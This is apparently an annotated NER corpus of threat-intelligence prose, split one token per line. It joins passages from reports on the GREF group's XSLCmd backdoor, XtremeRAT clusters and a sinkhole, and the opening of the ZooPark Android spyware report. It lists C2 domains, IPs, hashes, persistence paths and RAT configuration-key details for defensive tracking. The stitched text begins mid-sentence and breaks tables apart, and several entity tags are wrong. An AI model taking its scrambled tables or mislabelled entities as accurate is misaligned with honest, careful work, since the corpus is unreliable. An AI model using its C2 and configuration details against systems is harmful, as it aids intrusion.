software
running
on
the
server
to
access
and
control
the
system
.

Another
historical
TTP
attributed
to
GREF
was
their
frequent
re-use
of
specific
IP
ranges
to
both
perform
reconnaissance
and
launch
their
attacks
,
as
well
as
for
command
and
control
and
exfiltration
of
data
.

In
the
early
years
,
we
documented
them
routinely
using
IP
addresses
in
the
210.211.31.x
(
China
Virtual
Telecom
–
Hong
Kong
)
,
180.149.252.x
(
Asia
Datacenter
–
Hong
Kong
)
,
and
120.50.47.x
(
Qala
–
Singapore
)
.

In
addition
,
their
reconnaissance
activities
frequently
included
referrer
headers
from
google.com B_url.normal
and
google.com.hk  B_url.normal
with
search
features
such
as
'inurl
'
and
'filetype
'
looking
for
specific
systems
,
technologies
,
and
known
vulnerabilities
.

C2
Domains

GREF
is
known
to
have
sometimes
configured
their
malware
to
bare
IP
addresses
,
rather
than
domains
,
but
there
are
some
clusters
of
domain
registrants
that
we
attribute
to
them
.

Table
1
:
GREF
domain
registrations

Domain

Registrant
Email
Address

allshell[.]net B_url.cncsvr

attoo1s[.]com B_url.cncsvr

kasparsky[.]net B_url.cncsvr

kocrmicrosoft[.]com B_url.cncsvr

microsoft.org[.]tw B_url.cncsvr

microsoftdomainadmin[.]com B_url.cncsvr

microsoftsp3[.]com B_url.cncsvr

playncs[.]com B_url.cncsvr

softwareupdatevmware[.]com B_url.cncsvr

windowsnine[.]net B_url.cncsvr

cdngoogle[.]com B_url.cncsvr

cisco-inc[.]net B_url.cncsvr

mremote[.]biz B_url.cncsvr

officescan[.]biz B_url.cncsvr

oprea[.]biz B_url.cncsvr

battle.com[.]tw B_url.cncsvr

diablo-iii[.]mobi B_url.cncsvr

microsoftupdate[.]ws B_url.cncsvr

msftncsl[.]com B_url.cncsvr

square-enix[.]us B_url.cncsvr

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

cooweb51[@]hotmail.com

metasploit3[@]google.com

metasploit3[@]google.com

metasploit3[@]google.com

metasploit3[@]google.com

metasploit3[@]google.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

updatamicrosoft[.]com B_url.cncsvr

powershell.com[.]tw B_url.cncsvr

gefacebook[.]com B_url.cncsvr

attoo1s[.]com B_url.cncsvr

msnupdate[.]bz B_url.cncsvr

googlemapsoftware[.]com B_url.cncsvr

XSLCmd B_malware.backdoor
Usage

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

6g8wkx[@]gmail.com

skydrive1951[@]hotmail.com

skydrive1951[@]hotmail.com

For
the
majority
of
the
time
we
've
been
tracking
them
,
XSLCmd B_malware.backdoor
has
been
the
'go-to B_malware.backdoor
'
backdoor
for
GREF
,
as
shown
by
the
wide
range
of
compile
dates
for
the
Windows
samples
we
have
:
from
2009-01-05
to
2013-08-01
.

Appendix
2
provides
a
partial
list
of
Windows
sample
hashes
and
configuration
metadata
.

Since
Mach-O
binaries
do
not
have
a
compile
timestamp
like
Windows
executables
,
we
can
only
infer
from
other
data
when
the
OS
X
variant
was
developed
.

As
mentioned
above
,
the
'FakeDomain
'
was
configured
to
'www.appleupdate[.]biz
'
,
which
was
originally
registered
on
August
2
,
2012
,
and
the
registration
appears
to
have
updated
on
August
7
,
2014
,
but
the
registrant
is
still
the
same
'cast
west
'
.

When
we
found
the
sample
on
August
10
,
the
domain
did
not
resolve
and
there
were
no
historical
records
for
appleupdate[.]biz
in
any
of
the
passive
DNS
(
pDNS
)
sources
we
checked
.

In
the
intervening
weeks
,
it
has
been
seen
by
pDNS
sensors
,
with
the
first
query
occurring
on
August
12
,
2014
(
which
could
be
related
to
our
research
,
since
the
hits
are
'nxdomain
'
)
,
and
then
on
August
16
,
2014
there
are
pDNS
records
pointing
to
61.128.110.38
,
which
you
'll
notice
is
the
same
IP
the
OS
X
version
was
configured
to
use
.

This
could
hint
at
the
possibility
that
this
OS
X
port
of
XSLCmd B_malware.backdoor
was
recently
developed
and
deployed
;
however
,
this
remains
uncertain
.

Other
Backdoor
Usage

In
addition
to
XSLCmd B_malware.backdoor
,
GREF
has
utilized
a
number
of
other
backdoors
over
time
.

Another
backdoor
unique
to
them
,
which
we
call
'ddrh B_malware.backdoor
'
,
is
a
limited-feature
backdoor
that
was
frequently
dropped
in
the
SWC
attacks
in
2010
,
but
has
not
been
seen
much
since
.

Another
historical
backdoor
attributed
to
GREF
is
one
known
as
ERACS
or
Trojan.LURKER
(
not
to
be
confused
with
LURK0
variant
of
Gh0st
)
.

This
full-featured
backdoor
includes
the
usual
backdoor
functionality
,
including
the
support
for
additional
modules
,
but
it
also
includes
a
USB
monitoring
capability
that
generates
a
directory
listing
of
USB-connected
devices
.

We
have
also
observed
GREF
using
a
handful
of
other
common
backdoors
including
Poison B_malware.backdoor
Ivy I
,
Gh0st B_malware.backdoor
,
9002/HOMEUNIX B_malware.backdoor
,
HKDoor B_malware.backdoor
,
and
Briba
,
but
these
occurrences
have
been
pretty
rare
.

All
of
the
GREF
9002/HOMEUNIX B_malware.backdoor
samples
in
our
repository
have
compile
dates
from
2009
or
2010
.

Interestingly
enough
,
there
is
some
overlap
with
a
cluster
detailed
in
a
report
we
released
in
November
of
last
year
,
specifically
the
'AllShell
'
cluster
(
C2
:
smtp.allshell[.]net  B_url.cncsvr
)
.

Starting
in
mid-2012
,
GREF
started
using
the
Kaba/SOGU B_malware.backdoor
backdoor
.

These
early
samples
,
which
were
discussed
in
great
detail
by
LastLine
in
their
blog
post
'An
Analysis
of
PlugX
,
'
are
usually
bundled
into
a
RAR
self-extracting
executable
and
uses
the
three-part
loading
mechanism
consisting
of
an
executable
,
the
malicious
DLL
that
is
side-loaded
,
and
the
shellcode
file
.

In
mid-2013
,
GREF
switched
to
using
a
new
Kaba/SOGU B_malware.backdoor
builder
that
created
binaries
with
unique
metadata
.

For
example
,
many
of
these
samples
create
a
mutex
of
'PST-2.0
'
when
executed
,
and
some
have
the
shared
'HT
Applications
'
version
metadata
.

Conclusion

The
'A
'
in
APT
is
generally
used
to
describe
the
threat
actors
as
'Advanced
'
,
but
with
this
blog
,
we
also
see
that
they
are
also
'Adaptable
.
'

Not
only
have
they
adopted
new
Windows-based
backdoors
over
time
,
as
Apple
's
OS
X
platform
has
increased
in
popularity
in
many
companies
,
they
have
logically
adapted
their
toolset
to
match
in
order
to
gain
and
maintain
a
persistent
foothold
in
the
organizations
they
are
targeting
.

OS
X
has
gained
popularity
across
enterprises
,
from
less
savvy
users
who
find
it
easy
to
operate
,
to
highly
technical
users
that
utilize
its
more
powerful
features
,
as
well
as
with
executives
.

Many
people
also
consider
it
to
be
a
more
secure
computing
platform
,
which
may
lead
to
a
dangerous
sense
of
complacency
in
both
IT
departments
and
with
users
.

In
fact
,
while
the
security
industry
has
started
offering
more
products
for
OS
X
systems
,
these
systems
are
sometimes
less
regulated
and
monitored
in
corporate
environments
than
their
Windows
peers
.

Clearly
as
the
OS
X
platform
becomes
more
widely
adopted
across
enterprises
,
threat
groups
like
GREF
will
continue
to
adapt
and
find
ways
to
exploit
that
platform
.

Credit
to
Jay
Smith
for
his
initial
analysis
of
the
Windows
version
of
the
XSLCmd B_malware.backdoor
backdoor
and
Joshua
Homan
for
his
assistance
in
this
research
.

Appendix
1
:
XSLCmd B_malware.backdoor
for
OS
X
created
files

Filename

$
HOME/Library/LaunchAgents/clipboardd

/Library/Logs/clipboardd

$
HOME/Library/LaunchAgents/com.apple.service.clipboardd.plist

$
HOME/.fontset/pxupdate.ini

$
HOME/.fontset/chkdiska.dat

$
HOME/.fontset/chkdiskc.dat

$
HOME/Library/Logs/BackupData/
<
year
>
<
month><day>_<hr>_<min>_<sec>_keys.log

key
log
file

Purpose

executable

executable
when
run
as
super
user

plist
for
persistence

configuration
file

additional
configuration
file

additional
configuration
file

Appendix
2
:

XSLCmd B_malware.backdoor
sample
metadata
XtremeRAT B_malware.backdoor
:
Nuisance
or
Threat
?

Rather
than
building
custom
malware
,
many
threat
actors
behind
targeted
attacks
use
publicly
or
commercially
available
remote  B_malware.backdoor
access  i
Trojans i
(
RATs  B_malware.backdoor
)
.

This
pre-built
malware
has
all
the
functionality
needed
to
conduct
cyber
espionage
and
is
controlled
directly
by
humans
,
who
have
the
ability
to
adapt
to
network
defenses
.

As
a
result
,
the
threat
posed
by
these
RATs  B_malware.backdoor
should
not
be
underestimated
.

However
,
it
is
difficult
to
distinguish
and
correlate
the
activity
of
targeted
threat
actors
based
solely
on
their
preference
to
use
particular
malware
—
especially
,
freely
available
malware
.

From
an
analyst's
perspective
,
it
is
unclear
whether
these
actors
choose
to
use
this
type
of
malware
simply
out
of
convenience
or
in
a
deliberate
effort
to
blend
in
with
traditional
cybercrime
groups
,
who
also
use
these
same
tools
.

There
are
numerous
RATs  B_malware.backdoor
available
for
free
and
for
purchase
in
online
forums
,
chat
rooms
and
market
places
on
the
Internet
.

Most
RATs  B_malware.backdoor
are
easy
to
use
and
thus
attract
novices
.

They
are
used
for
a
variety
of
criminal
activity
,
including
'
sextortion  B_malware.infosteal
'
.

[1]
The
ubiquity
of
these
RATs  B_malware.backdoor
makes
it
difficult
to
determine
if
a
particular
security
incident
is
related
to
a
targeted
threat
,
cybercrime
or
just
a
novice
'
script
kiddie
'
causing
a
nuisance
.

Although
publicly
available
RATs  B_malware.backdoor
are
used
by
a
variety
of
operators
with
different
intents
,
the
activity
of
particular
threat
actors
can
still
be
tracked
by
clustering
command
and
control
server
information
as
well
as
the
information
that
is
set
by
the
operators
in
the
builder
.

These
technical
indicators
,
combined
with
context
of
an
incident
(
such
as
the
timing
,
specificity
and
human
activity
)
allow
analysts
to
assess
the
targeted
or
non-targeted
nature
of
the
threat
.

In
this
post
,
we
examine
a
publicly
available
RAT B_malware.backdoor
known
as
XtremeRAT B_malware.backdoor
.

This
malware
has
been
used
in
targeted
attacks
as
well
as
traditional
cybercrime
.

During
our
investigation
we
found
that
the
majority
of
XtremeRAT B_malware.backdoor
activity
is
associated
with
spam
campaigns
that
typically
distribute
Zeus  B_malware.infosteal
variants  i
and
other
banking-focused
malware
.

Why
have
these
traditional
cybercrime
operators
begun
to
distribute
RATs  B_malware.backdoor
?

This
seems
odd
,
considering
RATs  B_malware.backdoor
require
manual
labor
as
opposed
to
automated B_malware.infosteal
banking i
Trojans i
.

Based
on
our
observations
we
propose
one
or
more
of
the
following
possible
explanations
:
1
.
Smokescreen

The
operations
may
be
part
of
a
targeted
attack
that
seeks
to
disguise
itself
and
its
possible
targets
,
by
using
spam
services
to
launch
the
attacks
.

2
.
Less
traditional
tools
available

With
more
crimeware
author
arrests
and/or
disappearance
of
a
number
of
banking
Trojan
developers
,
cybercriminals
are
resorting
to
using
RATs  B_malware.backdoor
to
manually
steal
data
,
such
as
banking
and
credit
card
details
.

[2]
3
.
Complicated
defenses
require
more
versatile
tools

As
many
traditional
banking
and
financial
institutions
have
improved
their
security
practices
,
perhaps
attackers
have
had
a
much
more
difficult
time
developing
automation
in
their
Trojans B_malware.backdoor
to
cover
all
variations
of
these
defenses;
as
such
,
RATs  B_malware.backdoor
provide
more
versatility
and
effectiveness
,
at
the
expense
of
scalability
.

4
.
Casting
a
wider
net

After
compromising
indiscriminate
targets
,
attackers
may
dig
deeper
into
specific
targets
of
interest
and/or
sell
off
the
access
rights
of
the
victims
'
systems
and
their
data
to
others
.

These
possible
explanations
are
not
mutually
exclusive
.

One
or
all
of
them
may
be
factors
in
explaining
this
observed
activity
.

XtremeRAT B_malware.backdoor

The
XtremeRAT B_malware.backdoor
was
developed
by
'
xtremecoder
'
and
has
been
available
since
at
least
2010
.

Written
in
Delphi
,
the
code
of
XtremeRAT B_malware.backdoor
is
shared
amongst
several
other
Delphi
RAT
projects
including
SpyNet
,

CyberGate
,
and
Cerberus
.

The
RAT
is
available
for
free;
however
,
the
developer
charges
350
Euros
for
the
source
code
.

Unfortunately
for
xtremecoder
,
the
source
code
has
been
leaked
online
.

The
current
version
is
Xtreme
3
.
6
,
however
,
there
are
a
variety
of
'
private
'
version
of
this
RAT
available
as
well
.

As
such
,
the
official
version
of
this
RAT
and
its
many
variants
are
used
by
a
wide
variety
of
actors
.

XtremeRAT B_malware.backdoor
allows
an
attacker
to
:

Interact
with
the
victim
via
a
remote
shell

Upload/download
files

Interact
with
the
registry

Manipulate
running
processes
and
services

Capture
images
of
the
desktop

Record
from
connected
devices
,
such
as
a
webcam
or
microphone

Moreover
,
during
the
build
process
,
the
attacker
can
specify
whether
to
include
keylogging
and
USB
infection
functions
.

Extracting
Intelligence

XtremeRAT B_malware.backdoor
contains
two
components
:
a
'
client
'
and
a
'
server';
however
,
from
the
attacker's
perspective
,
these
terms
have
reversed
meanings
.

Specifically
,
according
to
the
author
,
the
'
server
'
component
is
the
malware
that
resides
on
victim
endpoints
that
connect
to
the
'
client
'
,
which
is
operated
by
the
attacker
from
one
or
more
remote
command-and-control
(
CnC
)
systems
.

Due
to
this
confusing
and
overloaded
terminology
,
we
refer
to
the
'
server
'
as
a
'
backdoor
'
on
the
victim
and
the
'
client
'
as
a
remote
'
controller
'
operated
by
the
attacker
.

XtremeRAT B_malware.backdoor
backdoors i
maintain
and
reference
configuration
data
that
was
chosen
by
the
attacker
at
the
time
they
were
built
.

This
data
can
contain
very
useful
hints
to
help
group
attacks
and
attribute
them
to
actors
,
similar
to
what
we
have
previously
described
in
our
Poison
Ivy
whitepaper
.

[3]

Several
versions
of
XtremeRAT B_malware.backdoor
write
this
configuration
data
to
disk
under
%APPDATA%\Microsoft\Windows
,
either
directly
,
or
to
a
directory
named
after
mutex
configured
by
the
attacker
.

When
written
to
disk
,
the
data
is
RC4
encrypted
with
a
key
of
either
'
CYBERGATEPASS
'
or
'
CONFIG
'
for
the
versions
we
have
analyzed
.

In
both
cases
,
the
key
is
Unicode
.
The
config
file
has
either
a
'
.
nfo
'
or
'
.
cfg
'
extension
depending
on
the
version
.

XtremeRAT's  B_malware.backdoor
key
scheduling
algorithm
(
KSA
)
implementation
contains
a
bug
wherein
it
only
considers
the
length
of
the
key
string
,
not
including
the
null
bytes
between
each
character
,
as
is
found
in
these
Unicode
strings
.

As
a
result
,
it
only
effectively
uses
the
first
half
of
the
key
.

For
example
,
the
key
'
C\x00O\x00N\x00F\x00I\x00G\x00
'
is
12
bytes
long
,
but
the
length
is
calculated
as
only
being
6
bytes
long
.

Because
of
this
,
the
key
that
is
ultimately
used
is
'
C\x00O\x00N\x00
'
.

The
configuration
data
includes
:

Name
of
the
installed
backdoor
file

Directory
under
which
the
backdoor
file
is
installed

Which
process
it
will
inject
into
(
if
specified
)

CnC
information

FTP
information
for
sending
stolen
keystroke
data
to

Mutex
name
of
the
master
process
,
ID
and
group
name
which
are
used
by
the
actors
for
organizational
purposes
.

Because
the
decrypted
configuration
data
can
be
reliably
located
in
memory
(
with
only
slight
variations
in
its
structure
from
version
to
version
)
and
because
not
all
versions
of
XtremeRAT B_malware.backdoor
will
write
their
configuration
data
to
disk
,
parsing
memory
dumps
of
infected
systems
is
often
the
ideal
method
for
extracting
intelligence
.

We
are
releasing
python
scripts
we
have
developed
to
gather
the
configuration
details
for
various
versions
of
XtremeRAT B_malware.backdoor
from
both
process
memory
dumps
and
the
encrypted
configuration
file
on
disk
.

The
scripts
are
available
at
https://github.com/fireeye/tools/tree/master/malware/Xtreme%20RAT B_url.normal
.

Also
included
in
this
toolset
is
a
script
that
decrypts
and
prints
the
contents
of
the
log
file
created
by
XtremeRAT B_malware.backdoor
containing
victim
keystroke
data
.

This
log
file
is
written
to
the
same
directory
as
the
config
file
and
has
a
'
.
dat
'
extension
.
Curiously
,
this
log
file
is
encrypted
with
a
simple
two-byte
XOR
instead
of
RC4
.

Later
in
this
blog
,
we
will
share
some
of
the
configuration
details
we
have
extracted
during
our
subsequent
analysis
.

XtremeRAT B_malware.backdoor
Activity

Using
telemetry
from
the
FireEye
Dynamic
Threat
Intelligence
(
DTI
)
cloud
,
we
examined
165
XtremeRAT B_malware.backdoor
samples
from
attacks
that
primarily
hit
the
following
sectors
:

Energy
,
utilities
,
and
petroleum
refining

Financial
Services

High-tech

These
incidents
include
a
spectrum
of
attacks
including
targeted
attacks
as
well
as
indiscriminate
attacks
.

Among
these
XtremeRAT-based B_malware.backdoor
attacks i
,
we
found
that
4
of
the
165
samples
were
used
in
targeted
attacks
against
the
High-Tech
sector
by
threat
actors
we
have
called
'
MoleRats
'
.
[4]

Operation
Molerats

In
2012
,
XtremeRAT B_malware.backdoor
was
used
against
a
variety
of
governments
as
well
as
Israeli
and
Palestinian
targets
in
what
was
known
as
Operation
Molerats
(
the
same
attackers
have
also
used
variants
of
the
Poison
Ivy
RAT
)
.

[5]
Upon
executing
one
particular
sample
(
45142b17abd8a17a5e38305b718f3415
)
,
the
malware
beacons
to
'
test
.
cable-modem
.
org
'
and
'
idf
.
blogsite
.
org
'
.
In
this
particular
case
,
the
attacker
used

XtremeRAT B_malware.backdoor
2 i
. i
9 i
within
a
self-extracting
archive
that
also
presents
a
decoy
document
to
the
victim
,
where
the
decoy
content
appears
to
have
been
copied
from
a
website
.

Figure
1
.
Contents
of
SFX
archive
containing
XtremeRAT B_malware.backdoor

Figure
2
.
SFX
settings
inside
malicious
archive

Figure
3
.
Decoy
content
presented
in
malicious
archive

Figure
4
.
shows
the
controller
the
attacker
uses
to
interact
with
systems
compromised
with
XtremeRAT B_malware.backdoor
.

In
this
case
,
it
appears
the
actor
used
the
ID
field
to
record
the
type
of
attack
delivered
(
docx
)
and
the
Group
field
was
used
to
record
a
'
campaign
code
'
(
IDF
)
,
which
helps
the
actor
keep
track
of
the
set
of
victims
that
were
attacked
during
this
campaign
.

Figure
4
.
XtremeRAT B_malware.backdoor
controller
GUI

The
attacker
modified
the
highlighted
information
at
build
time
.

By
default
,
the
XtremeRAT B_malware.backdoor
controller
sets
the
ID
field
as
'
Server
'
and
Group
field
as
'
Servers
'
,
with
the
default
password
used
to
authenticate
,
connect
,
and
control
a
compromised
endpoint
as
'
1234567890
'
.

Figure
5
.
XtremeRAT B_malware.backdoor
controller
connection
settings

In
the
Figure
5
,
the
attacker
specified
custom
CnC
servers
and
ports
and
changed
the
default
password
to
'
1411
'
.

The
attacker
also
changed
the
default
process
mutex
name
.

Figure
6
.
XtremeRat B_malware.backdoor
install
settings

By
default
,
the
controller
assigns
a
process
mutex
name
of
is
'
–((Mutex))–
'
and
the
attackers
changed
it
to
'
fdgdfdg
'
.

These
indicators
along
with
command
and
control
domain
names
and
the
IP
addresses
that
they
resolve
to
can
be
used
to
cluster
and
track
this
activity
over
time
.

Figure
7
.
Molerats
cluster
analysis

This
is
a
cluster
of
Molerats
activity
.

In
addition
to
using
the
password
'
1411
'
,
the
attackers
are
also
using
the
password
'
12345000
'
.

This
is
a
simple
way
to
track
the
activity
of
these
actors
by
using
both
passive
DNS
data
and
configuration
information
extracted
from
XtremeRAT B_malware.backdoor
.

Spam
Activity

The
vast
majority
of
XtremeRAT B_malware.backdoor
activity
clustered
around
the
default
password
'
1234567890
'
(
116
samples
)
.

There
was
overlap
between
this
large
cluster
and
the
second
largest
one
which
used
the
password
'
123456
'
(
12
samples
)
.

The
activity
in
these
two
clusters
aligns
with
indicators
observed
in
Spanish
language
spam
runs
.

The
'
123456
'
cluster
also
contains
spam
in
the
English
language
,
leveraging
the
recent
tragedy
in
Kenya
as
a
lure
.

[7]

The
Uranio
Cluster

In
our
sample
set
,
we
have
28
malware
samples
that
connect
to
a
set
of
sequentially
numbered
command
and
control
servers
:
uranio
.
no
-
ip
.
biz
uranio2
.
no
-
ip
.
biz
uranio3
.
no
-
ip
.
biz
uranio4
.
no
-
ip
.
biz
uranio5
.
no
-
ip
.
biz
uranio6
.
no
-
ip
.
biz
uranio7
.
no
-
ip
.
biz
platino
.
no
-
ip
.
biz
platino-2
.
no
-
ip
.
biz
platino-4
.
no
-
ip
.
biz
platino-5
.
no
-
ip
.
biz
platino-8
.
no
-
ip
.
biz
platino-9
.
no
-
ip
.
biz
cometa3
.
no
-
ip
.
biz
cometa4
.
no
-
ip
.
biz

The
malware
is
being
spammed
out
and
has
file
names
such
as
:

Certificaciones B_malware.drop
De  i
Pagos i
Nominas i
Parafiscales  i
jpg i
125420215 i
58644745574455  i
. i
exe  i

Soportes  B_malware.drop
de  i
pagos i
certificaciones i
y i
documentos  i
mes i
mayo  i
30  i
2013  i
567888885432235678888888123456  i
. i
exe  i

Certificaciones B_malware.drop
De  i
Pago  i
Y i
Para  i
Fiscales  i
. i
exe  i

We
extracted
the
configurations
for
a
sampling
of
the
XtremeRAT B_malware.backdoor
samples
we
came
across
in
this
spam
run
and
found
the
following
results
:

Group
a6135a6a6346a460792ce2da285778b1  B_hash
ABRIL
CmetaS3
988babfeec5111d45d7d7eddea6daf28  B_hash
ABRIL
CmetaS3
715f54a077802a0d67e6e7136bcbe340  B_hash
ABRIL
CmetaS3
167496763aa8d369ff482c4e2ca3da7d  B_hash
ABRIL
CmetaS3
3f288dfa95d90a3cb4503dc5f3d49c16  B_hash
Server
Cometa4
6a8057322e62c569924ea034508068c9  B_hash
Server
Platino4
37b90673aa83d177767d6289c4b90468  B_hash
Server
Platino4

C5AapWKh

C5AapWKh

C5AapWKh

C5AapWKh

Version
Mutex

Private

Private

Private

Private

Private

Private

Private
4QtgfoP
mbojnXS
mbojnXS
98fb1014f6e90290da946fdbca583334  B_hash
Server
Platino8
5a9547b727f0b4baf9b379328c797005  B_hash
Server
Platino8
fb98c8406e316efb0f46024f7c6a6739  B_hash
Server
Platino9
64f6f819a029956b8aeafb729512b460  B_hash
Server
Uranio
3a9237deaf25851f2511e355f8c506d7  B_hash

Server
Uranio3
c5e95336d52f94772cbdb2a37cef1d33  B_hash

Server
Uranio3
0ea60a5d4c8c629c98726cd3985b63c8  B_hash
Server
Uranio4
41889ca19c18ac59d227590eeb1da214  B_hash
Server
Uranio4
90e11bdbc380c88244bb0152f1142aff  B_hash

Server
Uranio4
c1ad4445f1064195de1d6756950e2ae9  B_hash
Server
Uranio5
e5b781ec77472d8d4b3b4a4d2faf5761  B_hash

Server
Uranio6
a921aa35deedf09fabee767824fd8f7e  B_hash

Server
Uranio6
9a2e510de8a515c9b73efdf3b141f6c2  B_hash
a6b862f636f625af2abcf5d2edb8aca2  B_hash
0327859be30fe6a559f28af0f4f603fe  B_hash

Uranio7

Uranio7

Uranio7
a4c47256a7159f9556375c603647f4c2  B_hash
Mayo
Uranio2011
3
.
6
62d6e190dcc23e838e11f449c8f9b723  B_hash
Mayo
Uranio2011
3
.
6
d5d99497ebb72f574c9429ecd388a019  B_hash
Mayo
Uranio2011
3
.
6

Private

Private

Private

Private

Private

Private

G7fjZQYAH

G7fjZQYAH
kUHwdc8Y
eYwJ6QX0i
0pg6ooH
0pg6ooH
xjUfrQHP6Xy
xjUfrQHP6Xy
xjUfrQHP6Xy

R9lmAhUK
0pg6ooH

Private
1
.
3
.
6
.
16
QwcgY0a
1
.
3
.
6
.
16
QwcgY0a
1
.
3
.
6
.
16
1
.
3
.
6
.
16
1
.
3
.
6
.
16

Private

Private

Private

Private

Private

Private

KdXTsbjJ6

KdXTsbjJ6

UBt3eQq0
iodjmGyP3

UBt3eQq0
'
Server
'
,
'
Servers
'
,
and
'
–((Mutex))–
'
are
the
defaults
in
the
XtremeRAT B_malware.backdoor
controller
for
ID
,
Group
,
and
Mutex
respectively
.

The
random
mutex
names
in
the
table
above
can
be
generated
by
double-clicking
in
the
Mutex
field
within
the
controller
.

In
most
cases
,
the
number
at
the
end
of
the
group
label
is
the
same
number
used
at
the
end
of
the
subdomain
for
the
CnC
.

In
the
case
of
'
Uranio2011
'
,
the
subdomain
is
simply
'
uranio
'
and
2011
represents
the
port
number
used
to
communicate
with
the
CnC
infrastructure
.

Figure
8
.
Portugese
version
of
XtremeRAT B_malware.backdoor
controller

Uranio
Sinkhole
Analysis

We
sinkhole
uranio2.no-ip.biz B_malware.unknown
between
November
22
,
2013
and
January
6
,
2014
.
During
that
time
,
12000
unique
IPs
connected
to
the
uranio2.no-ip.biz B_malware.unknown
.

Recall
,
that
this
number
reflects
only
one
of
many
command
and
control
servers
.

[8]

However
,
estimating
the
number
of
victims
this
way
is
difficult
due
to
DHCP
lease
times
,
which
inflate
the
numbers
,
and
NAT
connections
,
which
deflate
the
numbers
.

[9]
As
such
,
we
counted
the
unique
IP
addresses
that
connected
to
the
sinkhole
on
each
day
.

The
highest
number
of
connections
to
this
sinkhole
was
on
Dec
.

3
,
2013
with
2003
connections
and
the
lowest
was
Jan
.

6
,
2014
with
109
connections
.

The
average
number
of
unique
IP
addresses
that
connected
to
the
sinkhole
per
day
was
657
.

While
these
IP
addresses
were
in
ranges
assigned
to
40
distinct
countries
,
the
vast
majority
of
the
connections
to
the
sinkhole
(
92
.
7
percent
)
were
from
Colombia
.

Argentina
was
a
distant
second
with
1
.
22
percent
,
followed
by
Venezuela
with
1
.
02
percent
,
Egypt
with
0
.
95
percent
and
the
U.S.
with
0
.
9
percent
.

Conclusion

Determining
the
activity
of
targeted
threat
actors
is
difficult
.

Most
of
the
activity
associated
with
publicly
available
RATs  B_malware.backdoor
is
traditional
cybercrime
associated
with
spam
runs
,
banking B_malware.backdoor
Trojans i
and
malware
distribution
.

However
,
useful
indicators
can
be
extracted
from
these
ubiquitous  B_malware.backdoor
RATs  i
to
track
the
activities
of
targeted
threat
actors
(
as
well
as
cybercrime
)
.

Tools
https://github.com/fireeye/tools/tree/master/malware/Xtreme%20RAT B_url.normal

Notes
:
1
.
http://arstechnica.com/tech-policy/2013/09/miss-teen-usas-webcam-spy-called-himselfcutefuzzypuppy/  B_url.distribute
http://arstechnica.com/tech-policy/2011/09/how-an-omniscient-internet-sextortionistruined-lives/  B_url.distribute
2
.
The
group
behind
the
Carberp
banking
Trojan
were
arrested
http://www.techweekeurope.co.uk/news/carberp-botnet-leader-arrested-112205  B_url.distribute
,
the
author
of
Zeus
retired
,
http://krebsonsecurity.com/2010/10/spyeye-v-zeus-rivalry-ends-in-quiet-merger/  B_url.distribute
,
the
author
of
SpyEye
went
into
hiding
http://www.xylibox.com/2012/03/behind-spyeye-gribodemon.html  B_url.distribute
and
was
recently
arrested
http://www.wired.com/threatlevel/2014/01/spy-eye-author-guilty-plea/  B_url.distribute
,
FBI
and
Microsoft
have
gone
after
Citadel
which
is
not
off
the
market
https://blogs.rsa.com/citadels-stewardbanned-from-undergorund-venues/ B_url.normal
http://www.microsoft.com/en-us/news/press/2013/jun13/0605dcupr.aspx B_url.normal
and
an
overview
of
the
'
Big
4
'
banking B_malware.backdoor
Trojans i
http://blog.kaspersky.com/the-big-fourbanking-trojans/  B_url.distribute
3
.
http://www.fireeye.com/resources/pdfs/fireeye-poison-ivy-report.pdf B_url.normal
4
.
http://www.fireeye.com/blog/technical/2013/08/operation-molerats-middle-east-cyber-attacks-usingpoison-ivy.html B_url.normal
5
.
http://blog.trendmicro.com/trendlabs-security-intelligence/new-xtreme-rat-attacks-on-usisrael-andother-foreign-governments/ B_url.normal
http://download01.norman.no/whitepapers/Cyberattack_against_Israeli_and_Palestinian_targets.pdf B_url.normal
http://www.fireeye.com/blog/technical/2013/08/operation-molerats-middle-east-cyber-attacks-usingpoison-ivy.html B_url.normal
6
.
http://tools.cisco.com/security/center/viewThreatOutbreakAlert.x?alertId=30825 B_url.normal
7
.
http://www.symantec.com/connect/blogs/spammers-use-kenya-terrorist-attack-spread-malware B_url.normal
8
.
We
filtered
out
all
non-XtremeRAT
traffic
and
ensured
that
each
of
the
12000
IPs
attempted
to
make
an

XtremeRAT B_malware.backdoor
connection
.
9
.
https://www.usenix.org/legacy/event/hotbots07/tech/full_papers/rajab/rajab.pdf B_url.normal

This
entry
was
posted
in
Threat
Intelligence
,
Threat
Research
by
Nart
Villeneuve
and
James
T
.
Bennett
.

Bookmark
the
permalink
.
May
2018

WHO
'S
WHO
IN
THE
ZOO
.

CYBERESPIONAGE
OPERATION

TARGETS
ANDROID
USERS
IN

THE
MIDDLE
EAST
.

www.securelist.com B_url.normal

Kaspersky
Lab

Contents

Technical
Details
...............................................................................................................
3

Version
1.0
-
circa
2015
.............................................................................................................
4

Version
2.0
(
2016
)
-
lightweight
spyware
...................................................................................
6

Version
3.0
(
2016
)
-
commercial
fork
.........................................................................................
9

Version
4.0
(
2017
)
-
modern
spyware
......................................................................................
11

Infrastructure
...................................................................................................................
20

rhubarb2[.]com B_url.cncsvr
.........................................................................................................................
21

rhubarb3[.]com B_url.cncsvr
.........................................................................................................................
21

5.61.27[.]157 B_ip.cncsvr
............................................................................................................................
23

5.61.27[.]154 B_ip.cncsvr
............................................................................................................................
24

Distribution
......................................................................................................................
25

Telegram
channels
...................................................................................................................
25

watering B_malware.backdoor
holes I
.........................................................................................................................
27

Victims
.............................................................................................................................
33

Conclusions
.....................................................................................................................
34

Appendix
-
Indicators
of
compromise
...............................................................................
35

Malware
samples
.....................................................................................................................
35

C2
servers
................................................................................................................................
36

watering B_malware.backdoor
holes I
.........................................................................................................................
36

1

Who
's
who
in
the
Zoo
.

Cyberespionage
operation
targets
Android
users
in
the
Middle
East
.

Kaspersky
Lab

ZooPark B_malware.drop
is
a
cyberespionage
operation
that
has
been
focusing
on
Middle
Eastern
targets
since
at
least
June
2015
.

The
threat
actors
behind
ZooPark B_malware.drop
infect
Android
devices
using
several
generations
of
malware
we
label
from
v1-v4
,
with
v4
being
the
most
recent
version
deployed
in
2017
.

The
preferred
infection
vector
for
ZooPark B_malware.drop
is
waterhole B_malware.backdoor
attacks
.

